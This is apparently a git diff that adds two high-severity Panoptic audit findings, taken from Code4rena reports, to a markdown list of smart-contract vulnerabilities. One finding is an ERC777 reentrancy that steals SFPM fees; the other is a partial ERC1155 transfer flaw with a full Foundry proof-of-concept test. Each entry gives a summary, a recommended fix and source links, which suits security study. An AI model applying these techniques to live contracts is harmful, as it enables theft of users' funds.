@@ -663,3 +663,175 @@ index 6c5a1d7..196e3a0 100644
 
 - Impact & Recommendation: To prevent signature reuse due to malleability, use the latest OpenZeppelin ECDSA library, which ensures the s value is in the lower range, or implement a nonce system for maker signatures.
   <br> 🐬: [Source](https://code4rena.com/reports/2024-05-sofa-pro-league#h-03-signatures-from-makers-can-be-re-used-due-to-malleability) & [Report](https://code4rena.com/reports/2024-05-sofa-pro-league)
+
+## 12.[High] Attacker can steal all fees from SFPM in pools with ERC777 tokens
+
+### Update and Reentrancy
+
+- Summary: An attacker can steal all outstanding fees from the Short Financial Position Market (SFPM) in a Uniswap pool if a token in the pool is an ERC777. The attacker deploys a contract implementing the `tokensToSend()` hook and transfers the ERC1155 before `feesBase` is set. By burning the position, the attacker steals all available fees.
+
+- Impact & Recommendation: Update liquidity after minting/burning and use `ReentrancyLock()` modifier in `registerTokensTransfer()` to block reentrancy during minting and burning.
+  <br> 🐬: [Source](https://code4rena.com/reports/2023-11-panoptic#h-01-attacker-can-steal-all-fees-from-sfpm-in-pools-with-erc777-tokens) & [Report](https://code4rena.com/reports/2023-11-panoptic)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+        _moved = isLong == 0
+        ? _mintLiquidity(_liquidityChunk, _univ3pool)
+        : _burnLiquidity(_liquidityChunk, _univ3pool);
+    s_accountLiquidity[positionKey] = uint256(0).toLeftSlot(removedLiquidity).toRightSlot(
+        updatedLiquidity
+    );
+  ```
+
+  </details>
+
+## 13.[High] Partial transfers are still possible, leading to incorrect storage updates, and the calculated account premiums will be significantly different from what they should be
+
+### Wide restriction of ERC1155
+
+- Summary: Partial transfers of ERC1155 tokens in the protocol can lead to incorrect storage updates and significantly incorrect account premium calculations.
+
+- Impact & Recommendation: Check the left slot (`removedLiquidity`) during transfers and restrict transfers if `removedLiquidity` is greater than zero.
+  <br> 🐬: [Source](https://code4rena.com/reports/2023-11-panoptic#h-02-partial-transfers-are-still-possible-leading-to-incorrect-storage-updates-and-the-calculated-account-premiums-will-be-significantly-different-from-what-they-should-be) & [Report](https://code4rena.com/reports/2023-11-panoptic)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+  function test_transferpartial() public {
+        _initPool(1);
+        int24 width = 10;
+        int24 strike = currentTick + 100 - (currentTick % 10); // 10 is tick spacing. We subtract the remaining part, this way strike % tickspacing == 0.
+        uint256 positionSizeSeed = 1 ether;
+        // Create state with the parameters above.
+        populatePositionData(width, strike, positionSizeSeed);
+        console2.log("pos size: ", positionSize);
+        console2.log("current tick: ", currentTick);
+        //--------------------------- MINT BOTH: A SHORT PUT AND A LONG PUT ---------------------------------------
+        // MINTING SHORT PUT-----
+        // Construct tokenId for short put.
+        uint256 tokenIdforShortPut = uint256(0).addUniv3pool(poolId).addLeg(
+            0,
+            1,
+            isWETH,
+            0,
+            1,
+            0,
+            strike,
+            width
+        );
+        // Mint a short put position with 100% positionSize
+        sfpm.mintTokenizedPosition(
+            tokenIdforShortPut,
+            uint128(positionSize),
+            TickMath.MIN_TICK,
+            TickMath.MAX_TICK
+        );
+        // Alice's account liquidity after first mint will be like this --------------------> removed liq (left slot): 0 | added liq (right slot): liquidity
+        uint256 accountLiquidityAfterFirstMint = sfpm.getAccountLiquidity(
+                address(pool),
+                Alice,
+                1,
+                tickLower,
+                tickUpper
+            );
+        assertEq(accountLiquidityAfterFirstMint.leftSlot(), 0);
+        assertEq(accountLiquidityAfterFirstMint.rightSlot(), expectedLiq);
+        // MINTING LONG PUT----
+        // Construct tokenId for long put -- Same strike same width same token type
+        uint256 tokenIdforLongPut = uint256(0).addUniv3pool(poolId).addLeg(
+            0,
+            1,
+            isWETH,
+            1, // isLong true
+            1, // token type is the same as above.
+            0,
+            strike,
+            width
+        );
+        // This time mint but not with whole position size. Use 90% of it.
+        sfpm.mintTokenizedPosition(
+            tokenIdforLongPut,
+            uint128(positionSize * 9 / 10),
+            TickMath.MIN_TICK,
+            TickMath.MAX_TICK
+        );
+        // Account liquidity after the second mint will be like this: ------------------------  removed liq (left slot): 90% of the liquidity | added liq (right slot): 10% of the liquidity
+        uint256 accountLiquidityAfterSecondMint = sfpm.getAccountLiquidity(
+                address(pool),
+                Alice,
+                1,
+                tickLower,
+                tickUpper
+            );
+
+        // removed liq 90%, added liq 10%
+        // NOTE: there was 1 wei difference due to rounding. That's why ApproxEq is used.
+        assertApproxEqAbs(accountLiquidityAfterSecondMint.leftSlot(), expectedLiq * 9 / 10, 1);
+        assertApproxEqAbs(accountLiquidityAfterSecondMint.rightSlot(), expectedLiq * 1 / 10, 1);
+        // Let's check ERC1155 token balances of Alice.
+        // She sould have positionSize amount of short put token, and positionSize*9/10 amount of long put token.
+        assertEq(sfpm.balanceOf(Alice, tokenIdforShortPut), positionSize);
+        assertEq(sfpm.balanceOf(Alice, tokenIdforLongPut), positionSize * 9 / 10);
+        // -------------------------- TRANSFER ONLY 10% TO BOB -----------------------------------------------
+        /* During the transfer only the right slot is checked.
+           If the sender account's right slot liquidity is equal to transferred liquidity, transfer is succesfully made regardless of the left slot (as the whole net liquidity is transferred)
+        */
+
+        // The right side of the Alice's position key is only 10% of liquidity. She can transfer 1/10 of the short put tokens.
+        sfpm.safeTransferFrom(Alice, Bob, tokenIdforShortPut, positionSize * 1 / 10, "");
+        // After the transfer, Alice still has positionSize * 9/10 amount of short put tokens and long put tokens.
+        // NOTE: There was 1 wei difference due to rounding. That's why used approxEq.
+        assertApproxEqAbs(sfpm.balanceOf(Alice, tokenIdforShortPut), positionSize * 9 / 10, 1);
+        assertApproxEqAbs(sfpm.balanceOf(Alice, tokenIdforLongPut), positionSize * 9 / 10, 1);
+
+        // Bob has positionSize * 1/10 amount of short put tokens.
+        assertApproxEqAbs(sfpm.balanceOf(Bob, tokenIdforShortPut), positionSize * 1 / 10, 1);
+        // The more problematic thing is that tokens are still in the Alice's wallet but Alice's position key is updated to 0.
+        // Bob only got a little tokens but his position key is updated too, and he looks like he removed a lot of liquidity.
+        uint256 Alice_accountLiquidityAfterTransfer = sfpm.getAccountLiquidity(
+                address(pool),
+                Alice,
+                1,
+                tickLower,
+                tickUpper
+            );
+        uint256 Bob_accountLiquidityAfterTransfer = sfpm.getAccountLiquidity(
+                address(pool),
+                Bob,
+                1,
+                tickLower,
+                tickUpper
+            );
+        assertEq(Alice_accountLiquidityAfterTransfer.leftSlot(), 0);
+        assertEq(Alice_accountLiquidityAfterTransfer.rightSlot(), 0);
+
+        // Bob's account liquidity is the same as Alice's liq after second mint.
+        // Bob's account looks like he removed tons of liquidity. It will be like this: ---------------------  removed liq (left slot): 90% of the liquidity | added liq (right slot): 10% of the liquidity
+        assertEq(Bob_accountLiquidityAfterTransfer.leftSlot(), accountLiquidityAfterSecondMint.leftSlot());
+        assertEq(Bob_accountLiquidityAfterTransfer.rightSlot(), accountLiquidityAfterSecondMint.rightSlot());
+        console2.log("Bob's account removed liquidity after transfer: ", Bob_accountLiquidityAfterTransfer.leftSlot());
+        // -----------------------------------SCENARIO 2-----------------------------------------------
+        // ----------------------- ALICE NAIVELY BURNS LONG PUT TOKENS ---------------------------------
+        // Alice still had 90 long put and short put tokens. She wants to burn.
+        sfpm.burnTokenizedPosition(
+            tokenIdforLongPut,
+            uint128(positionSize * 9 / 10),
+            TickMath.MIN_TICK,
+            TickMath.MAX_TICK
+        );
+        uint256 Alice_accountLiquidityAfterBurn = sfpm.getAccountLiquidity(
+                address(pool),
+                Alice,
+                1,
+                tickLower,
+                tickUpper
+            );
+        // Her account liquidity left side is enormously big at the moment due to unchecked subtraction in line 979.
+        console2.log("Alice's account liquidity left side after burn: ", Alice_accountLiquidityAfterBurn.leftSlot());
+    }
+
+
+  ```
+
+  </details>
